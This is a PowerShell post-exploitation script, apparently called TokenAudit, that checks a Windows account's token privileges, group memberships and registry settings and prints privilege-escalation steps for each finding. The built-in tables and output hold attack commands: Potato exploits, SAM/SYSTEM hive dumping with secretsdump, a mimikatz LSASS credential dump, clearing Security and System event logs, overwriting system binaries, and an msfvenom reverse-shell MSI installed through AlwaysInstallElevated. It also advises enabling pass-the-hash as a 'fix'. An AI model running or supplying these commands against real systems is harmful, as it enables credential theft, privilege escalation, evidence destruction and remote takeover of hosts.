$ErrorActionPreference = 'SilentlyContinue'
Set-StrictMode -Off

$PRIV_INTEL = @{
    'SeImpersonatePrivilege' = @{
        Risk   = 'CRITICAL'
        Desc   = 'Impersonate any authenticated client token'
        Action = @(
            'GodPotato   : .\GodPotato.exe -cmd "cmd /c whoami"',
            'PrintSpoofer: .\PrintSpoofer.exe -i -c cmd',
            'RoguePotato : .\RoguePotato.exe -r <attacker> -e "cmd.exe"'
        )
    }
    'SeAssignPrimaryTokenPrivilege' = @{
        Risk   = 'CRITICAL'
        Desc   = 'Replace process token — Potato family prerequisite'
        Action = @(
            'Same Potato chain as SeImpersonatePrivilege',
            'GodPotato / PrintSpoofer apply here'
        )
    }
    'SeBackupPrivilege' = @{
        Risk   = 'HIGH'
        Desc   = 'Read any file bypassing DACL — SAM/SYSTEM/NTDS.dit readable'
        Action = @(
            'reg save HKLM\SAM C:\programdata\sam.bak',
            'reg save HKLM\SYSTEM C:\programdata\system.bak',
            'reg save HKLM\SECURITY C:\programdata\security.bak',
            'Then: impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL'
        )
    }
    'SeRestorePrivilege' = @{
        Risk   = 'HIGH'
        Desc   = 'Write any file bypassing DACL — replace binaries, plant DLLs'
        Action = @(
            'Overwrite service binary with payload',
            'Replace SAM/SYSTEM for hash extraction',
            'Plant DLL in protected path'
        )
    }
    'SeDebugPrivilege' = @{
        Risk   = 'HIGH'
        Desc   = 'Open handle to any process including LSASS'
        Action = @(
            'Dump LSASS: .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"',
            'Inject shellcode into privileged process',
            'Attach debugger to SYSTEM process'
        )
    }
    'SeTakeOwnershipPrivilege' = @{
        Risk   = 'HIGH'
        Desc   = 'Take ownership of any object regardless of DACL'
        Action = @(
            'takeown /f C:\Windows\System32\target.exe',
            'icacls C:\Windows\System32\target.exe /grant <user>:F',
            'Then overwrite with payload'
        )
    }
    'SeLoadDriverPrivilege' = @{
        Risk   = 'HIGH'
        Desc   = 'Load arbitrary kernel driver — kernel-level code execution'
        Action = @(
            'Load vulnerable driver (Capcom, RTCore64, etc.)',
            'Exploit for SYSTEM or DKOM'
        )
    }
    'SeShutdownPrivilege' = @{
        Risk   = 'LOW'
        Desc   = 'Shut down the system'
        Action = @('shutdown /r /t 0 — force reboot for persistence trigger')
    }
    'SeChangeNotifyPrivilege' = @{
        Risk   = 'INFO'
        Desc   = 'Bypass traverse checking — default for all users, rarely useful'
        Action = @('No direct escalation path')
    }
    'SeUndockPrivilege' = @{
        Risk   = 'INFO'
        Desc   = 'Undock laptop — no escalation path'
        Action = @('No direct escalation path')
    }
    'SeManageVolumePrivilege' = @{
        Risk   = 'MEDIUM'
        Desc   = 'Manage volumes including VSS shadow copies'
        Action = @(
            'Create VSS snapshot to read locked files',
            'Access NTDS.dit via shadow copy without domain admin'
        )
    }
    'SeSystemEnvironmentPrivilege' = @{
        Risk   = 'MEDIUM'
        Desc   = 'Modify firmware/NVRAM variables'
        Action = @('Persist via UEFI variables in some scenarios')
    }
    'SeSecurityPrivilege' = @{
        Risk   = 'MEDIUM'
        Desc   = 'Manage audit and security log — clear event logs'
        Action = @(
            'wevtutil cl Security',
            'wevtutil cl System',
            'Clear all logs to remove footprints'
        )
    }
    'SeSystemtimePrivilege' = @{
        Risk   = 'LOW'
        Desc   = 'Change system time — can affect Kerberos ticket validity'
        Action = @('Skew time to bypass Kerberos 5-minute window in some edge cases')
    }
    'SeCreateTokenPrivilege' = @{
        Risk   = 'CRITICAL'
        Desc   = 'Create arbitrary access tokens — direct privilege escalation'
        Action = @(
            'Craft token with any SID/privilege set',
            'Extremely rare — if present escalation is trivial'
        )
    }
    'SeTcbPrivilege' = @{
        Risk   = 'CRITICAL'
        Desc   = 'Act as part of the OS — create tokens for any user'
        Action = @(
            'Create logon sessions for any account',
            'Extremely powerful — treat as SYSTEM equivalent'
        )
    }
    'SeCreateSymbolicLinkPrivilege' = @{
        Risk   = 'MEDIUM'
        Desc   = 'Create symbolic links — enables symlink-based file planting'
        Action = @(
            'Symlink write to privileged path',
            'Used in junction-based escalation chains'
        )
    }
    'SeIncreaseBasePriorityPrivilege' = @{
        Risk   = 'INFO'
        Desc   = 'Raise process priority — DoS potential only'
        Action = @('No direct escalation path')
    }
    'SeProfileSingleProcessPrivilege' = @{
        Risk   = 'INFO'
        Desc   = 'Profile non-system processes'
        Action = @('No direct escalation path')
    }
    'SeSystemProfilePrivilege' = @{
        Risk   = 'INFO'
        Desc   = 'Profile system performance'
        Action = @('No direct escalation path')
    }
    'SeCreatePagefilePrivilege' = @{
        Risk   = 'INFO'
        Desc   = 'Create pagefile'
        Action = @('No direct escalation path')
    }
    'SeCreatePermanentPrivilege' = @{
        Risk   = 'LOW'
        Desc   = 'Create permanent kernel objects'
        Action = @('No direct escalation path')
    }
    'SeAuditPrivilege' = @{
        Risk   = 'LOW'
        Desc   = 'Generate audit log entries'
        Action = @('Log injection / noise generation')
    }
    'SeIncreaseQuotaPrivilege' = @{
        Risk   = 'INFO'
        Desc   = 'Adjust process memory quotas'
        Action = @('No direct escalation path')
    }
    'SeLockMemoryPrivilege' = @{
        Risk   = 'INFO'
        Desc   = 'Lock pages in memory'
        Action = @('No direct escalation path')
    }
    'SeNetworkLogonRight' = @{
        Risk   = 'MEDIUM'
        Desc   = 'Logon over the network — needed for lateral movement'
        Action = @('Confirms account usable for PTH / lateral movement')
    }
    'SeRemoteInteractiveLogonRight' = @{
        Risk   = 'MEDIUM'
        Desc   = 'RDP access allowed'
        Action = @('Account can RDP — useful for interactive access')
    }
    'SeDenyNetworkLogonRight' = @{
        Risk   = 'INFO'
        Desc   = 'Blocked from network logon — PTH will fail for this account'
        Action = @('Lateral movement blocked for this account')
    }
}

$GROUP_INTEL = @{
    'S-1-5-32-544' = @{
        Name   = 'BUILTIN\Administrators'
        Risk   = 'CRITICAL'
        Action = @('Full local admin — UAC bypass for full token if not already elevated')
    }
    'S-1-5-32-551' = @{
        Name   = 'BUILTIN\Backup Operators'
        Risk   = 'HIGH'
        Action = @(
            'SeBackupPrivilege + SeRestorePrivilege grantable',
            'reg save HKLM\SAM / SYSTEM / SECURITY then secretsdump'
        )
    }
    'S-1-5-32-548' = @{
        Name   = 'BUILTIN\Account Operators'
        Risk   = 'HIGH'
        Action = @(
            'Create/modify user accounts and group memberships',
            'Add self to privileged group (not Domain Admins directly)'
        )
    }
    'S-1-5-32-549' = @{
        Name   = 'BUILTIN\Server Operators'
        Risk   = 'HIGH'
        Action = @(
            'Start/stop services including modifying service binaries',
            'Modify/create scheduled tasks',
            'SeBackupPrivilege applies'
        )
    }
    'S-1-5-32-550' = @{
        Name   = 'BUILTIN\Print Operators'
        Risk   = 'HIGH'
        Action = @(
            'SeLoadDriverPrivilege — load malicious driver for SYSTEM',
            'Classic kernel escalation path'
        )
    }
    'S-1-5-32-552' = @{
        Name   = 'BUILTIN\Replicators'
        Risk   = 'MEDIUM'
        Action = @('File replication access — may reach sensitive shares')
    }
    'S-1-5-32-580' = @{
        Name   = 'BUILTIN\Remote Management Users'
        Risk   = 'MEDIUM'
        Action = @('WinRM access — Enter-PSSession / evil-winrm usable')
    }
    'S-1-5-32-555' = @{
        Name   = 'BUILTIN\Remote Desktop Users'
        Risk   = 'MEDIUM'
        Action = @('RDP access confirmed for this account')
    }
    'S-1-5-32-556' = @{
        Name   = 'BUILTIN\Network Configuration Operators'
        Risk   = 'MEDIUM'
        Action = @('Modify network settings — DNS poisoning, route manipulation')
    }
    'S-1-5-32-578' = @{
        Name   = 'BUILTIN\Hyper-V Administrators'
        Risk   = 'HIGH'
        Action = @(
            'Full access to Hyper-V VMs',
            'Mount VM VHDs to extract credentials offline'
        )
    }
    'S-1-5-32-569' = @{
        Name   = 'BUILTIN\Cryptographic Operators'
        Risk   = 'LOW'
        Action = @('Access to cryptographic operations — limited escalation path')
    }
}

$RISK_COLOR = @{
    'CRITICAL' = 'Red'
    'HIGH'     = 'Yellow'
    'MEDIUM'   = 'Magenta'
    'LOW'      = 'DarkYellow'
    'INFO'     = 'DarkGray'
}

function Get-IntegrityLevel {
    try {
        $id  = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $tok = $id.Token
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class TokUtil {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool GetTokenInformation(IntPtr h, int ic, IntPtr ti, int tl, out int rl);
    [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);
}
'@ -ErrorAction SilentlyContinue

        $hToken = [IntPtr]::Zero
        [TokUtil]::OpenProcessToken([TokUtil]::GetCurrentProcess(), 0x0008, [ref]$hToken) | Out-Null
        $size   = 0
        [TokUtil]::GetTokenInformation($hToken, 25, [IntPtr]::Zero, 0, [ref]$size) | Out-Null
        $buf    = [Runtime.InteropServices.Marshal]::AllocHGlobal($size)
        [TokUtil]::GetTokenInformation($hToken, 25, $buf, $size, [ref]$size) | Out-Null
        $sidPtr = [Runtime.InteropServices.Marshal]::ReadIntPtr($buf)
        $sid    = [System.Security.Principal.SecurityIdentifier]::new($sidPtr)
        [Runtime.InteropServices.Marshal]::FreeHGlobal($buf)
        $ridStr = $sid.Value.Split('-')[-1]
        $rid    = [int]$ridStr
        switch ($true) {
            ($rid -lt 4096)  { return 'Untrusted'  }
            ($rid -lt 8192)  { return 'Low'         }
            ($rid -lt 12288) { return 'Medium'      }
            ($rid -lt 16384) { return 'High'        }
            ($rid -lt 20480) { return 'System'      }
            default          { return 'Protected'   }
        }
    } catch { return 'Unknown' }
}

Write-Host ""
Write-Host "=== TokenAudit ===" -ForegroundColor Cyan
Write-Host ""

$id      = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$whoami  = $id.Name
$isAdmin = ([Security.Principal.WindowsPrincipal]$id).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$integ   = Get-IntegrityLevel

Write-Host "[ IDENTITY ]" -ForegroundColor Cyan
Write-Host "  User      : $whoami"
Write-Host "  Integrity : $integ" -ForegroundColor $(if ($integ -in @('High','System')) { 'Green' } elseif ($integ -eq 'Medium') { 'Yellow' } else { 'Red' })
Write-Host "  Is Admin  : $isAdmin" -ForegroundColor $(if ($isAdmin) { 'Green' } else { 'DarkGray' })
Write-Host ""

Write-Host "[ TOKEN PRIVILEGES ]" -ForegroundColor Cyan
$privLines = (whoami /priv 2>$null) -split "`n" | Where-Object { $_ -match '(Enabled|Disabled)' }
$actionable = [System.Collections.Generic.List[PSCustomObject]]::new()

foreach ($line in $privLines) {
    $line = $line.Trim()
    if (-not $line) { continue }
    $parts   = $line -split '\s{2,}'
    $privName = $parts[0].Trim()
    $state    = if ($line -match 'Enabled') { 'Enabled' } else { 'Disabled' }
    $intel    = $PRIV_INTEL[$privName]
    if (-not $intel) {
        Write-Host "  $state  $privName" -ForegroundColor DarkGray
        continue
    }
    $risk  = $intel.Risk
    $color = $RISK_COLOR[$risk]
    $flag  = if ($state -eq 'Enabled') { '[ENABLED ]' } else { '[DISABLED]' }
    Write-Host "  $flag [$risk] $privName" -ForegroundColor $color
    Write-Host "           $($intel.Desc)" -ForegroundColor DarkGray
    if ($state -eq 'Disabled' -and $risk -in @('CRITICAL','HIGH','MEDIUM')) {
        Write-Host "           -> Enable with: .\Enable-Privilege.ps1 $privName" -ForegroundColor DarkYellow
    }
    if ($risk -in @('CRITICAL','HIGH','MEDIUM')) {
        $actionable.Add([PSCustomObject]@{ Priv=$privName; State=$state; Risk=$risk; Intel=$intel })
    }
}

Write-Host ""
Write-Host "[ GROUP MEMBERSHIP IMPLICATIONS ]" -ForegroundColor Cyan
$myGroups = $id.Groups
$groupHits = [System.Collections.Generic.List[PSCustomObject]]::new()

foreach ($grp in $myGroups) {
    $sid   = $grp.Value
    $intel = $GROUP_INTEL[$sid]
    if (-not $intel) { continue }
    $color = $RISK_COLOR[$intel.Risk]
    Write-Host "  [$($intel.Risk)] $($intel.Name)" -ForegroundColor $color
    foreach ($a in $intel.Action) { Write-Host "    -> $a" -ForegroundColor DarkGray }
    $groupHits.Add([PSCustomObject]@{ SID=$sid; Intel=$intel })
}
if ($groupHits.Count -eq 0) { Write-Host "  No high-interest group memberships found." -ForegroundColor DarkGray }

Write-Host ""
Write-Host "[ MISCONFIGURATION CHECKS ]" -ForegroundColor Cyan

$latfp = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'LocalAccountTokenFilterPolicy' -ErrorAction SilentlyContinue).LocalAccountTokenFilterPolicy
if ($latfp -eq 1) {
    Write-Host "  [HIGH] LocalAccountTokenFilterPolicy = 1" -ForegroundColor Yellow
    Write-Host "    -> Remote local admin connections get FULL token" -ForegroundColor DarkGray
    Write-Host "    -> Pass-the-Hash lateral movement enabled" -ForegroundColor DarkGray
} else {
    Write-Host "  LocalAccountTokenFilterPolicy = 0 (default)" -ForegroundColor DarkGray
    Write-Host "    -> PTH lateral movement filtered for non-RID500 local admins" -ForegroundColor DarkGray
    Write-Host "    -> Fix if needed: Set-ItemProperty HKLM:\...\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1" -ForegroundColor DarkGray
}

$aieHKCU = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated' -ErrorAction SilentlyContinue).AlwaysInstallElevated
$aieHKLM = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated' -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($aieHKCU -eq 1 -and $aieHKLM -eq 1) {
    Write-Host "  [CRITICAL] AlwaysInstallElevated ENABLED (both hives)" -ForegroundColor Red
    Write-Host "    -> Any MSI runs as SYSTEM" -ForegroundColor DarkGray
    Write-Host "    -> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi > evil.msi" -ForegroundColor DarkGray
    Write-Host "    -> msiexec /quiet /i evil.msi" -ForegroundColor DarkGray
} elseif ($aieHKCU -eq 1 -or $aieHKLM -eq 1) {
    Write-Host "  [MEDIUM] AlwaysInstallElevated partially set (only one hive)" -ForegroundColor Magenta
    Write-Host "    -> Both hives must be 1 for full escalation" -ForegroundColor DarkGray
} else {
    Write-Host "  AlwaysInstallElevated not set" -ForegroundColor DarkGray
}

$uacLevel = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -ErrorAction SilentlyContinue).ConsentPromptBehaviorAdmin
if ($null -ne $uacLevel) {
    $uacDesc = switch ($uacLevel) {
        0 { '[CRITICAL] UAC fully disabled — admin runs with full token always' }
        1 { '[HIGH] UAC elevates without prompt for signed binaries' }
        2 { '[MEDIUM] UAC prompts for credentials' }
        5 { '[DEFAULT] UAC prompts for consent on secure desktop' }
        default { "[INFO] UAC level: $uacLevel" }
    }
    $uacColor = if ($uacLevel -le 1) { 'Red' } elseif ($uacLevel -eq 2) { 'Magenta' } else { 'DarkGray' }
    Write-Host "  $uacDesc" -ForegroundColor $uacColor
    if ($uacLevel -eq 0) {
        Write-Host "    -> Admin shell already has full token. No bypass needed." -ForegroundColor DarkGray
    }
}

$wdacStatus = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
if ($wdacStatus) {
    $cgEnabled = $wdacStatus.VirtualizationBasedSecurityStatus
    if ($cgEnabled -ge 2) {
        Write-Host "  [INFO] Credential Guard ENABLED" -ForegroundColor DarkGray
        Write-Host "    -> LSASS memory protected — mimikatz sekurlsa will fail" -ForegroundColor DarkGray
    }
}

Write-Host ""
Write-Host "[ ACTIONABLE SUMMARY ]" -ForegroundColor Cyan

$criticals = $actionable | Where-Object { $_.Risk -eq 'CRITICAL' }
$highs     = $actionable | Where-Object { $_.Risk -eq 'HIGH' }

if ($criticals) {
    Write-Host "  CRITICAL PATHS:" -ForegroundColor Red
    foreach ($c in $criticals) {
        Write-Host "    $($c.Priv) [$($c.State)]" -ForegroundColor Red
        foreach ($a in $c.Intel.Action) { Write-Host "      $a" -ForegroundColor DarkGray }
    }
}

if ($highs) {
    Write-Host "  HIGH PATHS:" -ForegroundColor Yellow
    foreach ($h in $highs) {
        Write-Host "    $($h.Priv) [$($h.State)]" -ForegroundColor Yellow
        foreach ($a in $h.Intel.Action) { Write-Host "      $a" -ForegroundColor DarkGray }
    }
}

if (-not $criticals -and -not $highs -and $groupHits.Count -eq 0) {
    Write-Host "  No immediate escalation paths found from current token." -ForegroundColor DarkGray
    Write-Host "  Consider: service account compromise, UAC bypass, or AD ACL abuse." -ForegroundColor DarkGray
}

Write-Host ""
